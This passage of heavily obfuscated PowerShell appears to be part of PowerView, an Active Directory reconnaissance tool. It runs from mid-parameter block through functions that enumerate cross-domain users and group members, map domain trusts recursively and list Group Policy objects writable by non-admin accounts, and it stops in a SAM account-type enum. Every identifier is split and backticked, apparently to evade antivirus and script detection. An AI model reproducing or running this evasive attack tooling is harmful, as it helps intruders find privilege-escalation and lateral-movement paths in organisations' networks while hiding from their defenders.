        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROp`er`Ties},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'th','a','ADSP'})]
        [String]
        ${seaRc`HBA`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f'er','Do','ma','inControll'})]
        [String]
        ${SE`RVeR},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{0}{2}{1}" -f'OneLe','el','v'}, {"{2}{1}{0}"-f'e','re','Subt'})]
        [String]
        ${sE`A`RChSCOPE} = ("{1}{0}{2}"-f 'u','S','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSULtPag`EsIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERVE`R`TImEL`ImIt},

        [ValidateSet({"{0}{1}"-f 'Dac','l'}, {"{1}{0}" -f'p','Grou'}, {"{0}{1}" -f 'No','ne'}, {"{1}{0}"-f'ner','Ow'}, {"{1}{0}"-f 'acl','S'})]
        [String]
        ${SecuRI`TYMAs`kS},

        [Switch]
        ${TomB`s`TONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`E`den`TiAL} =  (&("{0}{1}{2}"-f'GET-CH','IldIT','eM') ('VA'+'riaB'+'LE:pK'+'FeZN')  )."VA`luE"::"em`pty"
    )

    BEGIN {
        ${sEARCHE`RArGu`MeN`TS} = @{}
        ${SEArch`E`RarguMe`NTS}[("{1}{2}{0}{3}" -f 'lte','LDAPF','i','r')] = (("{1}{2}{3}{0}"-f')','(mem','be','rof=*'))
        if (${PSB`oU`N`Dp`ARamETe`RS}[("{1}{0}"-f'ain','Dom')]) { ${SearChe`R`Ar`GUme`N`TS}[("{0}{1}" -f 'Do','main')] = ${doM`AiN} }
        if (${p`sBOUN`Dp`ARAM`ETERS}[("{2}{0}{1}" -f'opertie','s','Pr')]) { ${s`EaRCH`erArG`UMEnts}[("{1}{0}{2}{3}" -f 'pert','Pro','ie','s')] = ${PR`OpEr`TIES} }
        if (${Psbo`U`NdP`ArA`mE`TerS}[("{2}{0}{3}{1}"-f 'ch','ase','Sear','B')]) { ${sEaRC`HE`RaRG`UMenTs}[("{0}{1}{2}"-f'Se','ar','chBase')] = ${sEarC`hBa`sE} }
        if (${ps`B`o`UNdp`Ar`AMETers}[("{1}{0}" -f 'er','Serv')]) { ${s`e`ArcHer`ARGU`m`enTs}[("{0}{1}{2}" -f 'Serv','e','r')] = ${Se`RVeR} }
        if (${PsBounDp`ARA`MET`ErS}[("{1}{0}{2}"-f'rchScop','Sea','e')]) { ${SEarC`heRa`RG`UMeNtS}[("{0}{2}{1}"-f'S','archScope','e')] = ${sEA`RChs`Co`pE} }
        if (${PsBOUn`dp`Ar`AM`e`TerS}[("{0}{4}{3}{1}{2}" -f'Re','P','ageSize','lt','su')]) { ${seaRC`HER`A`RG`UmeNtS}[("{3}{4}{0}{1}{2}"-f'Pa','g','eSize','Resul','t')] = ${RESulTp`Ag`EsiZE} }
        if (${psBounDPARA`MET`E`Rs}[("{2}{0}{3}{1}"-f 'T','t','Server','imeLimi')]) { ${SEA`Rch`eRA`RGum`EnTs}[("{3}{2}{0}{1}"-f 'im','it','verTimeL','Ser')] = ${Se`RV`ErTiMEl`I`MIT} }
        if (${pSb`oUnd`pARAmET`ErS}[("{1}{2}{0}"-f 's','SecurityMa','sk')]) { ${sE`A`RCh`erARG`Umen`Ts}[("{2}{3}{0}{1}"-f's','ks','S','ecurityMa')] = ${s`Ec`UrITyM`As`ks} }
        if (${Ps`B`OUnD`Pa`RAmeters}[("{2}{1}{0}" -f'one','mbst','To')]) { ${SEAR`C`herARGU`mEn`TS}[("{3}{2}{0}{1}" -f'o','ne','mbst','To')] = ${tOm`BSTo`Ne} }
        if (${Psb`oU`NDpAra`ME`TErS}[("{1}{0}{2}" -f'tia','Creden','l')]) { ${SeARch`e`RAr`G`U`mENTS}[("{1}{2}{0}" -f'l','Creden','tia')] = ${CRE`dEN`Tial} }
        if (${p`Sb`oundpara`mE`TeRs}['Raw']) { ${SEARc`h`Er`ArGUMeNTS}['Raw'] = ${R`Aw} }
    }

    PROCESS {
        &("{0}{2}{1}{3}{4}" -f'Get-','mainUs','Do','e','r') @SearcherArguments  | &("{1}{0}{2}"-f 'h-Objec','ForEac','t') {
            ForEach (${ME`mB`Er`sHiP} in ${_}."m`eM`BerOf") {
                ${iN`D`eX} = ${MeM`Be`RSHiP}.("{1}{0}" -f 'dexOf','In').Invoke('DC=')
                if (${iND`EX}) {

                    ${gROU`PDOM`A`IN} = $(${m`EMB`ErS`HIp}.("{0}{1}{2}" -f'SubS','tr','ing').Invoke(${IN`dex})) -replace 'DC=','' -replace ',','.'
                    ${uSeRd`iSti`NguI`S`He`Dn`Ame} = ${_}."Di`STI`NgUISHeDn`AME"
                    ${uS`eR`INdEX} = ${use`R`DiStiNGUIS`HED`N`Ame}.("{0}{1}"-f 'Ind','exOf').Invoke('DC=')
                    ${usErD`o`main} = $(${_}."dI`stinGUisHed`Na`me".("{0}{1}{2}"-f'Su','b','String').Invoke(${Us`ERiN`deX})) -replace 'DC=','' -replace ',','.'

                    if (${Gr`oUPdO`MaIN} -ne ${u`sERd`oMA`in}) {

                        ${Gr`o`UpnAme} = ${membE`R`sHIp}.("{1}{0}" -f't','Spli').Invoke(',')[0].("{0}{1}" -f'spli','t').Invoke('=')[1]
                        ${for`Eig`N`USER} = &("{2}{0}{1}"-f'e','w-Object','N') ("{2}{1}{0}"-f 't','jec','PSOb')
                        ${FOR`eIGNu`s`Er} | &("{0}{2}{1}" -f 'Add-M','ber','em') ("{0}{2}{3}{1}"-f'Notepro','y','per','t') ("{1}{3}{2}{0}"-f 'in','UserD','ma','o') ${U`sErDo`mAiN}
                        ${ForeiG`N`UsER} | &("{1}{2}{0}" -f'd-Member','A','d') ("{1}{2}{0}" -f'y','Notepro','pert') ("{1}{0}{2}"-f's','U','erName') ${_}."SamaCc`o`U`NtNamE"
                        ${for`EIgn`U`SeR} | &("{3}{2}{0}{1}"-f 'embe','r','-M','Add') ("{3}{0}{2}{1}"-f 'pr','rty','ope','Note') ("{1}{2}{0}{4}{5}{6}{3}" -f 'ingui','U','serDist','ame','s','hed','N') ${_}."d`Ist`i`NGU`iSH`EDname"
                        ${foR`e`IGNus`er} | &("{1}{0}{2}{3}"-f'd-Memb','Ad','e','r') ("{2}{3}{0}{1}" -f'opert','y','Notep','r') ("{2}{0}{1}" -f'pDomai','n','Grou') ${grOu`pD`OMAIN}
                        ${F`o`REIgnU`Ser} | &("{2}{1}{0}"-f'ember','M','Add-') ("{2}{0}{1}{3}"-f'p','ropert','Note','y') ("{0}{2}{1}" -f'G','e','roupNam') ${GR`OuPn`AMe}
                        ${FOR`E`iGNuSEr} | &("{0}{2}{1}" -f'Add-Mem','r','be') ("{0}{3}{2}{1}"-f 'No','y','ropert','tep') ("{5}{3}{2}{0}{4}{1}{6}"-f'nguis','edN','upDisti','o','h','Gr','ame') ${m`EmBErS`hIp}
                        ${FoReI`gn`UseR}."P`sobje`ct"."t`ypEnAmes".("{1}{2}{0}" -f 't','Inse','r').Invoke(0, ("{0}{2}{4}{3}{1}"-f'PowerVie','r','w','ignUse','.Fore'))
                        ${fOReI`GnU`S`Er}
                    }
                }
            }
        }
    }
}

function gEt`-dO`mAInF`OreigNg`R`OUpmEMb`Er {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{1}{0}{3}" -f'Proces','ld','hou','s','PSS'}, '')]
    [OutputType({"{1}{0}{4}{3}{2}{5}"-f'rView','Powe','mb','ForeignGroupMe','.','er'})]
    [CmdletBinding()]
    Param(
        [Parameter(PositioN = 0, vALUEfrOMPIPElINE = ${tr`UE}, vaLueFroMPiPELINEbYpROPertYnamE = ${T`RUe})]
        [Alias({"{1}{0}" -f'e','Nam'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'F','lter','i'})]
        [String]
        ${l`d`ApFIlteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrOp`ERt`i`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${S`Ea`RcHb`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{3}{2}"-f 'D','inC','oller','ontr','oma'})]
        [String]
        ${s`ErVer},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{1}{0}" -f'vel','OneLe'}, {"{1}{0}{2}"-f 'ubtr','S','ee'})]
        [String]
        ${SE`A`Rch`scOpE} = ("{0}{1}"-f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esu`lt`pAgeSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRve`R`T`ImELIM`It},

        [ValidateSet({"{0}{1}"-f'Dac','l'}, {"{1}{0}"-f 'p','Grou'}, {"{1}{0}" -f 'ne','No'}, {"{0}{1}" -f 'Owne','r'}, {"{0}{1}" -f 'Sac','l'})]
        [String]
        ${SeCUriTy`m`AS`Ks},

        [Switch]
        ${T`Om`Bst`OnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`DEnt`i`Al} =  ${P`KF`ezN}::"EMp`TY"
    )

    BEGIN {
        ${SEaRch`e`RARguM`E`Nts} = @{}
        ${se`AR`CH`er`A`RGUments}[("{0}{1}{2}" -f 'L','DAPFilte','r')] = ("{0}{3}{2}{1}"-f'(m',')','er=*','emb')
        if (${PSBOuND`paR`A`m`ETE`RS}[("{1}{0}{2}"-f'om','D','ain')]) { ${SeAR`ChEr`ARGuMEn`Ts}[("{0}{1}"-f'D','omain')] = ${d`O`mAIN} }
        if (${P`SBouN`d`PaRameTERS}[("{2}{0}{1}" -f 'r','operties','P')]) { ${sear`c`HERarGu`MENTS}[("{1}{0}{2}"-f 'rop','P','erties')] = ${pR`oPERTi`es} }
        if (${Ps`B`OunDpa`RA`MetErS}[("{0}{1}{2}" -f'Sear','chB','ase')]) { ${SEARcH`ER`A`RGUME`NTs}[("{1}{2}{0}" -f 'se','SearchB','a')] = ${s`E`ARcH`BAse} }
        if (${pS`BOu`NdpAra`mETE`Rs}[("{1}{2}{0}" -f'er','Se','rv')]) { ${sEarCH`ERA`Rgum`eN`TS}[("{0}{1}" -f 'Serve','r')] = ${s`e`RVer} }
        if (${pS`B`ouNdpAr`AMETE`RS}[("{0}{2}{1}" -f 'S','cope','earchS')]) { ${S`earcHERa`RGU`m`entS}[("{1}{3}{0}{2}"-f 'c','Sear','ope','chS')] = ${se`ARC`hS`CoPE} }
        if (${PsB`ounD`pa`RA`M`EtErS}[("{2}{0}{1}{3}{4}"-f'esult','Page','R','Si','ze')]) { ${sEaRCH`eRAR`gU`menTS}[("{0}{1}{2}{3}" -f 'R','es','ultPa','geSize')] = ${rEsu`ltPage`S`Ize} }
        if (${Ps`BOUNDPa`Ram`eTe`RS}[("{0}{2}{3}{4}{1}" -f'Ser','it','verTimeL','i','m')]) { ${se`ArCH`eraRgumeN`TS}[("{0}{2}{1}"-f'ServerT','t','imeLimi')] = ${S`Erv`ER`TIMEL`imit} }
        if (${psB`ou`N`DpaRa`meTERs}[("{0}{2}{1}" -f 'S','Masks','ecurity')]) { ${S`ea`RCHEr`ArGuM`e`Nts}[("{1}{0}{2}"-f 'tyMa','Securi','sks')] = ${SeC`UriT`YMASkS} }
        if (${pSBOun`DPARA`ME`TERs}[("{1}{0}" -f'tone','Tombs')]) { ${sEAR`c`H`e`RargUm`EntS}[("{3}{1}{2}{0}" -f'e','omb','ston','T')] = ${TO`mbs`T`OnE} }
        if (${P`SBou`NDpar`AMET`E`Rs}[("{1}{2}{0}"-f'al','Creden','ti')]) { ${seARche`RaR`gu`me`NtS}[("{0}{2}{1}" -f'C','edential','r')] = ${cR`Edenti`Al} }
        if (${p`SBoU`Ndpa`R`AMET`ERs}['Raw']) { ${SE`Arc`H`eRARGUmEN`Ts}['Raw'] = ${R`Aw} }
    }

    PROCESS {

        ${eX`CL`UDeGr`oUps} = @(("{1}{0}"-f'ers','Us'), ("{0}{2}{1}"-f'D','rs','omain Use'), ("{2}{0}{1}" -f 's','ts','Gue'))

        &("{3}{2}{1}{0}"-f'p','Grou','n','Get-Domai') @SearcherArguments | &("{0}{1}{2}" -f 'Wher','e-Ob','ject') { ${E`xCL`UDEG`RoUps} -notcontains ${_}."sAmACcOUn`Tna`ME" } | &("{1}{0}{2}" -f'orEach-Objec','F','t') {
            ${G`RoUPN`A`mE} = ${_}."SAMAccO`U`NtNAMe"
            ${gRoUPD`iS`T`iNguIsheDna`me} = ${_}."DIStiNgui`s`HEd`NaME"
            ${gROu`pDoma`iN} = ${gr`oUp`diST`iNgUIs`HEdNAmE}.("{1}{0}{2}{3}"-f 'S','Sub','trin','g').Invoke(${gr`oU`P`dISTiNg`UI`sHednaMe}.("{0}{2}{1}" -f 'In','f','dexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."mem`BEr" | &("{2}{1}{3}{0}" -f 'ct','Obj','ForEach-','e') {

                ${mEm`BeR`DOmAIn} = ${_}.("{1}{2}{0}" -f 'g','Sub','Strin').Invoke(${_}.("{0}{2}{1}"-f 'In','xOf','de').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{2}{3}{1}{0}" -f '-.*','*','CN=S-1','-5-21.')) -or (${G`ROUP`dOMAIn} -ne ${MEM`Berd`Oma`IN})) {
                    ${M`EmBErDi`ST`In`gUisHE`DNaME} = ${_}
                    ${M`emBer`NAme} = ${_}.("{0}{1}"-f 'Spl','it').Invoke(',')[0].("{1}{0}" -f'lit','sp').Invoke('=')[1]

                    ${F`Or`e`IGNgR`oU`P`MEMbER} = &("{0}{2}{1}"-f'N','ct','ew-Obje') ("{2}{1}{0}"-f 'ct','Obje','PS')
                    ${FoRe`IgngR`OUP`MeMbER} | &("{0}{2}{1}"-f 'A','ber','dd-Mem') ("{1}{3}{2}{0}" -f'y','Notep','rt','rope') ("{0}{1}{2}{3}" -f'Gro','upDo','m','ain') ${GrO`UpDoM`A`In}
                    ${ForEiG`N`GroUpM`EmbeR} | &("{2}{0}{1}" -f 'd','-Member','Ad') ("{1}{0}{2}" -f 'otepropert','N','y') ("{1}{0}"-f'oupName','Gr') ${gRoUp`N`Ame}
                    ${FoReIGngrOu`pm`EmB`eR} | &("{0}{1}{2}{3}" -f'A','dd','-','Member') ("{2}{0}{1}{3}" -f 't','e','No','property') ("{3}{5}{1}{0}{4}{6}{2}" -f'g','in','e','GroupDi','uishedNa','st','m') ${Gr`OupDisT`InGU`iS`hedNAme}
                    ${F`OR`eig`NgROUpm`emBeR} | &("{3}{1}{2}{0}"-f'er','dd-M','emb','A') ("{1}{3}{0}{2}" -f 'er','No','ty','teprop') ("{2}{0}{1}" -f 'er','Domain','Memb') ${mem`B`e`RDO`MAIN}
                    ${ForEIgN`g`Rou`pME`M`Ber} | &("{2}{0}{1}"-f '-','Member','Add') ("{0}{1}{3}{2}" -f'N','oteprope','y','rt') ("{1}{0}{3}{2}" -f'mbe','Me','me','rNa') ${Me`MbERN`AME}
                    ${FOrEIG`Ng`R`OUp`mEMbEr} | &("{2}{1}{0}"-f 'r','-Membe','Add') ("{0}{3}{1}{2}"-f 'Notepro','ert','y','p') ("{5}{2}{3}{0}{1}{6}{4}"-f 'i','sting','er','D','hedName','Memb','uis') ${m`EMB`ERDIStInG`UI`S`HeDN`AME}
                    ${fo`ReI`gNgr`oupMemb`ER}."P`So`BJECt"."TyP`ENAm`es".("{0}{1}" -f'Inser','t').Invoke(0, ("{1}{2}{3}{0}{4}"-f'GroupM','PowerV','iew.Forei','gn','ember'))
                    ${Fore`igNgro`UPMeM`BEr}
                }
            }
        }
    }
}

function Get-dO`M`AiNTRu`StMAPpiNG {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}{4}" -f'ouldP','h','roc','PSS','ess'}, '')]
    [OutputType({"{2}{3}{4}{1}{0}"-f 'ET','ew.DomainTrust.N','Po','wer','Vi'})]
    [OutputType({"{0}{4}{3}{1}{2}{5}"-f'P','rust','.LD','werView.DomainT','o','AP'})]
    [OutputType({"{2}{1}{3}{5}{0}{4}" -f'u','owerVie','P','w.DomainT','st.API','r'})]
    [CmdletBinding(DefaULTpArAMEtERSeTname = {"{1}{0}" -f 'DAP','L'})]
    Param(
        [Parameter(ParaMetErSetname = 'API')]
        [Switch]
        ${A`Pi},

        [Parameter(PARaMEteRSETnAME = 'NET')]
        [Switch]
        ${N`eT},

        [Parameter(ParAMeTeRsETNAme = "L`DAP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'Fi','lter'})]
        [String]
        ${l`DApf`i`LtEr},

        [Parameter(PARaMeTErsetNaMe = "ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`Ro`PErt`iES},

        [Parameter(pARAMETeRsETName = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f 'A','ath','DSP'})]
        [String]
        ${Se`Ar`C`hbaSe},

        [Parameter(PArAmEteRsetnAMe = "lD`AP")]
        [Parameter(PARaMeTeRSeTNAmE = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{3}{1}{2}" -f'D','nContr','oller','i','oma'})]
        [String]
        ${S`erV`er},

        [Parameter(ParAmEteRSeTNaMe = "l`daP")]
        [ValidateSet({"{1}{0}" -f'se','Ba'}, {"{1}{2}{0}"-f'el','On','eLev'}, {"{0}{2}{1}"-f 'S','tree','ub'})]
        [String]
        ${sEarchSc`o`pe} = ("{1}{2}{0}" -f'ee','Sub','tr'),

        [Parameter(pARameTERSETNamE = "lD`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${R`ES`UlTPAge`s`izE} = 200,

        [Parameter(ParAMETersEtnAmE = "Ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SERv`e`RTi`ME`l`imit},

        [Parameter(pArameTErSETname = "L`dap")]
        [Switch]
        ${t`om`Bs`ToNe},

        [Parameter(PaRamETeRsETNAMe = "l`dap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`DENT`IAl} =  ( &("{3}{2}{0}{1}"-f 'L','DiTEM','I','gET-CH')  ("{1}{3}{0}{2}" -f 'lE:PkFE','VaRI','zn','ab'))."v`Alue"::"EM`Pty"
    )

    ${S`eE`N`DOmAINs} = @{}

    ${d`OMa`INs} = &("{0}{2}{1}"-f'New','ct','-Obje') ("{4}{1}{3}{6}{0}{5}{2}"-f 'C','te','ctions.Stack','m','Sys','olle','.')

    ${D`O`maIntrUsta`RGu`MeNts} = @{}
    if (${PsbO`UnDPAra`m`e`TErS}['API']) { ${D`omAiNtRU`st`AR`gumEn`Ts}['API'] = ${a`pI} }
    if (${pSb`O`U`NDPaR`AME`TerS}['NET']) { ${d`oma`inTrusTa`RgUme`Nts}['NET'] = ${N`eT} }
    if (${pSB`oUN`D`p`ARAMETe`Rs}[("{0}{1}{2}"-f'LD','APFi','lter')]) { ${DoMAIntr`USTaR`G`Um`eNTS}[("{0}{3}{2}{1}" -f 'L','r','Filte','DAP')] = ${LDa`pF`IlT`ER} }
    if (${ps`BoU`NDPA`RA`ME`Ters}[("{0}{2}{1}" -f 'Prop','ties','er')]) { ${DO`mAI`N`T`R`USTa`RgUmENTs}[("{0}{2}{1}" -f 'Prop','ies','ert')] = ${p`ROpER`TiES} }
    if (${PSbOuN`Dp`A`RamETerS}[("{0}{2}{1}"-f'Sea','hBase','rc')]) { ${DOmAi`NtrUsTA`R`GuMe`N`Ts}[("{2}{0}{1}{3}"-f'rc','hBas','Sea','e')] = ${SE`A`RCHBase} }
    if (${PsbOUNDPA`R`AmE`Te`Rs}[("{1}{0}"-f'ver','Ser')]) { ${dO`M`AINTRUS`T`AR`GuMEnts}[("{0}{1}{2}"-f'Se','rv','er')] = ${S`eRVER} }
    if (${ps`BOUndpa`Ram`ET`eRS}[("{2}{1}{0}"-f 'hScope','arc','Se')]) { ${DOM`Ai`NTruST`ArgumE`N`Ts}[("{0}{1}{2}" -f'Search','Sco','pe')] = ${SE`A`Rc`HScOpe} }
    if (${PsBo`UNDPaRam`E`TeRS}[("{0}{2}{3}{1}"-f'Resul','Size','tP','age')]) { ${dOM`AI`NtruSt`ARg`U`Me`NTs}[("{2}{0}{3}{1}" -f'P','Size','Result','age')] = ${r`ES`UlTPAgE`sizE} }
    if (${PsBO`UNdParaMe`T`eRs}[("{2}{1}{3}{0}"-f 'mit','rv','Se','erTimeLi')]) { ${dOm`Aintr`UsTa`Rgumen`TS}[("{4}{2}{1}{3}{0}" -f 'it','rTime','rve','Lim','Se')] = ${SErV`e`RT`I`mElimIt} }
    if (${psBOu`N`D`pArame`TERs}[("{3}{0}{1}{2}"-f 'mb','st','one','To')]) { ${dOmainTr`Usta`Rg`UMeN`TS}[("{1}{2}{0}"-f 'one','Tomb','st')] = ${TO`mBS`TonE} }
    if (${psbOuND`P`A`R`AMeTerS}[("{0}{1}{2}" -f'Credenti','a','l')]) { ${D`Om`AINtrU`STA`Rgum`EN`TS}[("{0}{1}{2}" -f'Credenti','a','l')] = ${cRedE`NtI`Al} }

    if (${PsBO`U`Nd`PaRaM`Et`ErS}[("{0}{2}{1}" -f 'Cre','al','denti')]) {
        ${c`U`R`REnTdO`maIN} = (&("{0}{1}{2}"-f 'Get','-','Domain') -Credential ${c`REdeNti`Al})."N`AME"
    }
    else {
        ${cURrEn`Td`o`m`AIN} = (&("{2}{0}{1}" -f'o','main','Get-D'))."nA`mE"
    }
    ${D`oMAi`NS}.("{1}{0}"-f 'ush','P').Invoke(${cu`Rr`ENTD`oMaiN})

    while(${dO`mains}."co`Unt" -ne 0) {

        ${DOM`A`In} = ${Dom`AiNs}.("{0}{1}" -f'Po','p').Invoke()

        if (${doMa`in} -and (${d`omAIN}.("{0}{1}" -f 'Tr','im').Invoke() -ne '') -and (-not ${SEE`Ndoma`ins}.("{1}{2}{0}" -f 'ainsKey','Co','nt').Invoke(${DoM`AIn}))) {

            &("{2}{1}{0}"-f'e','os','Write-Verb') ('[G'+'e'+'t-Dom'+'a'+'inT'+'rustMa'+'pping] '+'Enume'+'r'+'a'+'ting '+'tru'+'st'+'s '+'fo'+'r '+'domain'+': '+"'$Domain'")

            ${NU`lL} = ${SeE`N`DOMaI`Ns}.("{0}{1}"-f'A','dd').Invoke(${d`omain}, '')

            try {

                ${DoMA`iNTRUs`Tar`Gu`meNTS}[("{1}{0}" -f'in','Doma')] = ${DO`main}
                ${tr`Us`Ts} = &("{2}{4}{0}{3}{1}"-f'omai','t','G','nTrus','et-D') @DomainTrustArguments

                if (${T`Ru`sTS} -isnot [System.Array]) {
                    ${tr`US`TS} = @(${TR`UStS})
                }

                if (${PsC`mD`l`et}.ParaMeTerseTnamE -eq 'NET') {
                    ${FOR`Es`Tt`R`UST`ARGuMENTS} = @{}
                    if (${pS`B`oundPa`RAmEters}[("{1}{0}"-f 'rest','Fo')]) { ${FoRESt`T`R`UstarG`UMENts}[("{1}{0}{2}"-f 'o','F','rest')] = ${Fo`ResT} }
                    if (${PsbOu`NDP`Ara`ME`T`ERS}[("{0}{2}{1}" -f 'Cr','ial','edent')]) { ${fO`ReSTTRUs`Ta`RgumEN`TS}[("{2}{1}{0}"-f'tial','en','Cred')] = ${cREDe`Nt`iAL} }
                    ${t`RuS`TS} += &("{2}{0}{1}{3}" -f 'F','ore','Get-','stTrust') @ForestTrustArguments
                }

                if (${t`Ru`stS}) {
                    if (${tru`s`TS} -isnot [System.Array]) {
                        ${TR`U`StS} = @(${tR`U`Sts})
                    }

                    ForEach (${Tr`UsT} in ${T`RU`sTS}) {
                        if (${Tr`U`ST}."s`OU`RCena`Me" -and ${T`RusT}."T`ARget`NA`Me") {

                            ${n`UlL} = ${Do`mAiNS}.("{1}{0}"-f 'sh','Pu').Invoke(${TR`UST}."tArg`etn`AME")
                            ${Tru`ST}
                        }
                    }
                }
            }
            catch {
                &("{0}{1}{2}{3}" -f'Wr','ite-','Ver','bose') ('[Get'+'-D'+'omainTr'+'ustMappin'+'g] '+'Error:'+' '+"$_")
            }
        }
    }
}

function get`-gPODeL`eGa`Tion {
    [CmdletBinding()]
    Param (
        [String]
        ${gpoN`A`me} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${Pag`esiZe} = 200
    )

    ${Ex`C`LUsIons} = @(("{0}{1}{2}"-f 'SY','S','TEM'),("{0}{3}{2}{1}" -f'D','n Admins','i','oma'),("{3}{2}{1}{0}"-f's','in','e Adm','Enterpris'))

    ${FO`RE`st} =   (&("{0}{1}{2}"-f 'VARi','aB','le')  ("{1}{0}" -f 'rY','x') )."Va`LUe"::("{0}{1}{2}" -f 'Get','CurrentF','orest').Invoke()
    ${Do`Ma`INLiST} = @(${F`oreST}."dO`M`AiNS")
    ${DoM`AIns} = ${dOmAinL`I`sT} | &("{0}{1}{2}" -f 'forea','c','h') { ${_}.("{1}{3}{2}{0}" -f 'ntry','Get','ectoryE','Dir').Invoke() }
    foreach (${dO`Ma`In} in ${do`MAiNS}) {
        ${fILT`Er} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${Se`ARC`HEr} = &("{1}{2}{0}{3}"-f'-Ob','Ne','w','ject') ("{4}{7}{10}{11}{9}{0}{8}{2}{3}{1}{6}{5}" -f'to','o','vices.Dire','ct','S','her','rySearc','ys','rySer','.Direc','te','m')
        ${s`EARCHer}."SEA`RCH`Ro`Ot" = ${dO`MAIn}
        ${SeA`RCH`eR}."fi`Lter" = ${f`iL`TEr}
        ${se`A`RChER}."PAg`eS`IZe" = ${P`AG`ESiZe}
        ${Se`A`RchER}."seARC`Hsc`opE" = ("{0}{2}{1}" -f'S','tree','ub')
        ${lISt`gpO} = ${sE`ArC`Her}.("{0}{1}" -f 'FindAl','l').Invoke()
        foreach (${g`po} in ${l`istG`Po}){
            ${A`Cl} = ([ADSI]${G`Po}."PA`TH")."O`BjecTS`e`cuRiTy"."acc`ESS" | &('?') {${_}."AcTIvEdIrE`CtOrY`R`ig`htS" -match ("{1}{0}" -f'rite','W') -and ${_}."aC`C`E`ssConTrOlt`y`pe" -eq ("{1}{0}" -f 'low','Al') -and  ${e`x`clUSIOns} -notcontains ${_}."iDEnTI`T`yRefe`REnCE".("{1}{0}"-f'tring','toS').Invoke().("{0}{1}" -f'spli','t').Invoke("\")[1] -and ${_}."iDen`TI`TYR`EFerEn`Ce" -ne ("{1}{2}{0}{3}" -f' OWNE','CREAT','OR','R')}
        if (${A`cL} -ne ${nu`ll}){
            ${g`pOAcL} = &("{3}{2}{1}{0}"-f 'ct','Obje','w-','Ne') ("{1}{0}"-f 'ect','psobj')
            ${G`Poa`Cl} | &("{2}{1}{0}"-f'd-Member','d','A') ("{3}{1}{0}{2}" -f 'oper','tepr','ty','No') ("{1}{0}"-f'DSPath','A') ${g`Po}."P`R`Opert`iES"."A`dspatH"
            ${gP`oacL} | &("{0}{2}{1}"-f'A','er','dd-Memb') ("{0}{2}{1}"-f 'Notepro','erty','p') ("{1}{3}{0}{2}"-f 'ayNa','GPODis','me','pl') ${g`po}."pro`peRTI`eS"."dISp`layN`A`ME"
            ${G`P`oacL} | &("{2}{0}{3}{1}" -f 'dd-','mber','A','Me') ("{2}{0}{3}{1}" -f'o','ty','N','teproper') ("{4}{1}{0}{3}{2}"-f'fer','tyRe','nce','e','Identi') ${a`cl}."i`De`NTI`TYREfe`ReNcE"
            ${gP`O`Acl} | &("{1}{0}{2}{3}" -f'd','A','d-M','ember') ("{0}{1}{2}" -f 'Note','prop','erty') ("{3}{2}{0}{4}{5}{1}"-f'eDire','Rights','iv','Act','c','tory') ${A`CL}."Act`ivEdIREcT`O`RYRIg`HtS"
            ${GPo`A`cL}
        }
        }
    }
}

${M`od} = &("{1}{2}{0}{3}" -f 'y','New-InM','emor','Module') -ModuleName ("{1}{0}"-f 'n32','Wi')

${sAmaC`c`O`U`NTtyPEe`NUm} = &("{1}{0}"-f 'senum','p') ${m`oD} ("{2}{3}{4}{1}{6}{5}{0}"-f 'eEnum','.Sa','Pow','erVi','ew','tTyp','mAccoun') ("{1}{0}" -f'2','UInt3') @{
    ("{2}{3}{0}{1}" -f'JEC','T','DOMAIN','_OB')                   =   ("{1}{3}{0}{2}" -f '00','0x000','0','00')
    ("{3}{1}{2}{0}"-f'CT','OUP','_OBJE','GR')                    =   ("{0}{1}{2}" -f'0x1','0000','000')
    ("{3}{6}{4}{1}{5}{0}{2}"-f'JE','P_','CT','NON_SECURITY','U','OB','_GRO')       =   ("{3}{2}{1}{0}"-f '01','0','x10000','0')
    ("{3}{0}{1}{2}" -f'A','S_OBJ','ECT','ALI')                    =   ("{0}{2}{1}" -f '0','00','x200000')
    ("{0}{5}{3}{1}{4}{2}{6}"-f 'NON_SECU','Y_ALIAS_','BJ','T','O','RI','ECT')       =   ("{2}{0}{3}{1}"-f'2','00001','0x','00')
    ("{0}{1}{3}{2}" -f 'USE','R_','T','OBJEC')                     =   ("{0}{2}{3}{1}" -f'0x300','0','0','000')
    ("{1}{0}{2}"-f'A','M','CHINE_ACCOUNT')                 =   ("{2}{1}{0}" -f'1','0000','0x300')
    ("{0}{2}{4}{3}{1}"-f'TRUS','T','T_ACC','UN','O')                   =   ("{0}{2}{1}" -f '0x3','00002','00')
    ("{2}{1}{0}" -f'ROUP','IC_G','APP_BAS')                 =   ("{3}{2}{1}{0}"-f '0','00','40000','0x')
